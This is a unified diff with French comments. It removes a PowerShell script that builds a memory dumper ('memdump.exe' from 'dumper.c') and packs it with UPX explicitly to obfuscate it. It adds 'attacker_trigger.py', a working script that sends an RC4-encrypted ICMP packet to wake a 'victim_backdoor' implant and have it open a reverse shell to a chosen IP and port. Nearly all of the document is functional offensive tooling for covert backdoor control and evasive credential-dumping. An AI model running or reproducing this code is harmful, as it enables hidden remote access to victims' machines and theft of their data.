@@ -1,135 +1,90 @@
-# Vérification et installation de Chocolatey
-function Install-Chocolatey {
-    if (-Not (Get-Command choco -ErrorAction SilentlyContinue)) {
-        Write-Host "[*] Chocolatey not found. Installing..."
-        Set-ExecutionPolicy Bypass -Scope Process -Force
-        Invoke-WebRequest -Uri "https://community.chocolatey.org/install.ps1" -UseBasicParsing | Invoke-Expression
-        Write-Host "[+] Chocolatey installed successfully."
-    } else {
-        Write-Host "[+] Chocolatey already installed."
-    }
-}
+#!/usr/bin/env python3
+"""
+attacker_trigger.py - Envoi d’un paquet ICMP déclencheur chiffré via RC4
 
-# Vérification et installation de GCC via Chocolatey
-function Install-GCC {
-    if (-Not (Get-Command gcc -ErrorAction SilentlyContinue)) {
-        Write-Host "[*] GCC not found. Installing via Chocolatey..."
-        choco install mingw -y
-        Write-Host "[+] GCC installed successfully."
-    } else {
-        Write-Host "[+] GCC already installed."
-    }
-}
+Usage:
+    sudo ./attacker_trigger.py <target_ip> <reverse_ip> <reverse_port> [secret_key]
 
-# Vérification et installation de Zlib
-function Install-Zlib {
-    $zlibIncludePath = "C:\mingw64\include\zlib.h"
-    $zlibLibPath = "C:\mingw64\lib\libz.a"
+Si secret_key n'est pas fourni, il utilise la valeur par défaut.
+"""
 
-    if (-Not (Test-Path $zlibIncludePath) -or -Not (Test-Path $zlibLibPath)) {
-        Write-Host "[*] Zlib not found. Downloading and installing..."
-        
-        # Télécharger l'archive tar.gz
-        $zlibArchive = "zlib.tar.gz"
-        $zlibUrl = "https://zlib.net/current/zlib.tar.gz"
-        Invoke-WebRequest -Uri $zlibUrl -OutFile $zlibArchive
+import socket
+import struct
+import sys
+import os
 
-        # Créer un dossier temporaire pour l'extraction
-        $extractDir = "C:\zlib_extract"
-        if (-Not (Test-Path $extractDir)) {
-            New-Item -ItemType Directory -Path $extractDir | Out-Null
-        }
-        
-        # Extraire l'archive avec tar (Windows 10/11 intègre tar)
-        tar -xzf $zlibArchive -C $extractDir
+ICMP_ECHO_REQUEST = 8
+DEFAULT_SECRET_KEY = "wA@2mC!dq"  # Doit correspondre à SECRET_KEY dans victim_backdoor.c
 
-        # Récupérer le sous-dossier extrait (on suppose qu'il y en a un unique)
-        $subFolder = Get-ChildItem -Path $extractDir -Directory | Select-Object -First 1
-        if ($null -eq $subFolder) {
-            Write-Host "[!] Extraction failed. Exiting."
-            exit 1
-        }
+def rc4(data: bytes, key: bytes) -> bytes:
+    """Implémente RC4 pour chiffrer ou déchiffrer les données."""
+    S = list(range(256))
+    j = 0
+    out = bytearray()
+    for i in range(256):
+        j = (j + S[i] + key[i % len(key)]) % 256
+        S[i], S[j] = S[j], S[i]
+    i = 0
+    j = 0
+    for byte in data:
+        i = (i + 1) % 256
+        j = (j + S[i]) % 256
+        S[i], S[j] = S[j], S[i]
+        out.append(byte ^ S[(S[i] + S[j]) % 256])
+    return bytes(out)
 
-        # Chemins des fichiers attendus dans le sous-dossier
-        $zlibFile = Join-Path $subFolder.FullName "zlib.h"
-        $zconfFile = Join-Path $subFolder.FullName "zconf.h"
-        $libzFile  = Join-Path $subFolder.FullName "libz.a"
-        $dllFile   = Join-Path $subFolder.FullName "zlib1.dll"
+def checksum(source_bytes: bytes) -> int:
+    """Calcule le checksum pour le paquet ICMP."""
+    count_to = (len(source_bytes) // 2) * 2
+    s = 0
+    for count in range(0, count_to, 2):
+        this_val = source_bytes[count+1] * 256 + source_bytes[count]
+        s += this_val
+        s &= 0xffffffff
+    if count_to < len(source_bytes):
+        s += source_bytes[-1]
+        s &= 0xffffffff
+    s = (s >> 16) + (s & 0xffff)
+    s += (s >> 16)
+    answer = ~s & 0xffff
+    return socket.htons(answer)
 
-        if (-Not (Test-Path $zlibFile) -or -Not (Test-Path $zconfFile) -or -Not (Test-Path $libzFile) -or -Not (Test-Path $dllFile)) {
-            Write-Host "[!] Required Zlib files not found. Exiting."
-            exit 1
-        }
+def create_icmp_packet(secret_key: str, reverse_ip: str, reverse_port: str) -> bytes:
+    """Construit un paquet ICMP contenant le payload déclencheur chiffré par RC4."""
+    packet_id = os.getpid() & 0xFFFF
+    packet_seq = 1
+    payload_str = f"{secret_key} {reverse_ip} {reverse_port}"
+    payload = payload_str.encode()
+    encrypted_payload = rc4(payload, secret_key.encode())
+    header = struct.pack("!BBHHH", ICMP_ECHO_REQUEST, 0, 0, packet_id, packet_seq)
+    packet = header + encrypted_payload
+    chksum = checksum(packet)
+    header = struct.pack("!BBHHH", ICMP_ECHO_REQUEST, 0, chksum, packet_id, packet_seq)
+    return header + encrypted_payload
 
-        # Déplacer les fichiers dans les répertoires cibles
-        Move-Item -Path $zlibFile -Destination "C:\mingw64\include" -Force
-        Move-Item -Path $zconfFile -Destination "C:\mingw64\include" -Force
-        Move-Item -Path $libzFile  -Destination "C:\mingw64\lib" -Force
-        Move-Item -Path $dllFile   -Destination "C:\Windows\System32" -Force
+def send_icmp_packet(target_ip: str, packet: bytes):
+    """Envoie le paquet ICMP via un socket RAW."""
+    try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
+    except PermissionError:
+        print("Ce script doit être exécuté en tant qu'administrateur/root.")
+        sys.exit(1)
+    sock.sendto(packet, (target_ip, 1))
+    sock.close()
+    print(f"[+] Paquet ICMP envoyé vers {target_ip}")
 
-        # Nettoyer les fichiers temporaires
-        Remove-Item $zlibArchive -Force
-        Remove-Item $extractDir -Recurse -Force
+def usage():
+    print(f"Usage: {sys.argv[0]} <target_ip> <reverse_ip> <reverse_port> [secret_key]")
+    sys.exit(1)
 
-        Write-Host "[+] Zlib installed successfully."
-    } else {
-        Write-Host "[+] Zlib already installed."
-    }
-}
+if __name__ == "__main__":
+    if len(sys.argv) < 4:
+        usage()
 
+    target_ip = sys.argv[1]
+    reverse_ip = sys.argv[2]
+    reverse_port = sys.argv[3]
+    secret_key = sys.argv[4] if len(sys.argv) >= 5 else DEFAULT_SECRET_KEY
 
-# Vérification et installation de UPX
-function Install-UPX {
-    if (-Not (Test-Path "C:\UPX\upx.exe")) {
-        Write-Host "[*] UPX not found. Downloading..."
-        Invoke-WebRequest -Uri "https://github.com/upx/upx/releases/download/v5.0.0/upx-5.0.0-win64.zip" -OutFile "upx-5.0.0-win64.zip"
-        Expand-Archive -Path "upx-5.0.0-win64.zip" -DestinationPath "C:\UPX" -Force
-        Remove-Item "upx-5.0.0-win64.zip"
-        Write-Host "[+] UPX installed successfully."
-    } else {
-        Write-Host "[+] UPX already installed."
-    }
-}
-
-# Compilation du programme C avec GCC
-function Compile-CProgram {
-    $sourceFile = "dumper.c"
-    $executable = "memdump.exe"
-
-    if (-Not (Get-Command gcc -ErrorAction SilentlyContinue)) {
-        Write-Host "[!] GCC not found. Make sure MinGW is installed."
-        exit 1
-    }
-
-    Write-Host "[*] Compiling C program..."
-    gcc -o $executable $sourceFile -lz -lws2_32 -lDbgHelp
-    if ($LASTEXITCODE -ne 0) {
-        Write-Host "[!] Compilation failed."
-        exit 1
-    } else {
-        Write-Host "[+] Compilation successful: $executable"
-    }
-}
-
-# Obfuscation de l'exécutable avec UPX
-function Obfuscate-Executable {
-    $exePath = "memdump.exe"
-    if (Test-Path "C:\UPX\upx.exe") {
-        Write-Host "[*] Obfuscating executable with UPX..."
-        Start-Process -FilePath "C:\UPX\upx.exe" -ArgumentList "--best $exePath" -Wait
-        Write-Host "[+] Obfuscation completed."
-    } else {
-        Write-Host "[!] UPX not found. Skipping obfuscation."
-    }
-}
-
-# Lancement des fonctions
-Install-Chocolatey
-Install-GCC
-Install-Zlib
-Install-UPX
-Compile-CProgram
-Obfuscate-Executable
-
-
-Write-Host "[+] Operation Complete"
+    packet = create_icmp_packet(secret_key, reverse_ip, reverse_port)
+    send_icmp_packet(target_ip, packet)
